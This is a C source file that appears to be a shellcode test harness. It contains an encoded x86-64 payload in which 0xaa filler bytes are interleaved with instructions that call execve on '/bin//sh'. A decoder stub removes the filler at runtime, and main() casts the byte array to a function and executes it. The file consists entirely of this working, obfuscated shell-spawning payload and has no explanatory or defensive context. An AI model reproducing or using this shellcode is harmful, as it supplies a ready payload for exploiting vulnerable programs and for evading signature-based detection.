#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x43\x48\xaa\x31\xaa\xc0\xaa\x50\xaa\x48\xaa\xbb\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x53\xaa\x48\xaa\x89\xaa\xe7\xaa\x50\xaa\x48\xaa\x89\xaa\xe2\xaa\x57\xaa\x48\xaa\x89\xaa\xe6\xaa\x48\xaa\x83\xaa\xc0\xaa\x3b\xaa\x0f\xaa\x05\xbb\xbb\xbb\xbb\x48\x8d\x35\xb6\xff\xff\xff\x48\x8d\x7e\x01\x48\x31\xc0\xb0\x01\x48\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\xa2\x8a\x5c\x06\x01\x88\x1f\x48\xff\xc7\x04\x02\xeb\xeb";

main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
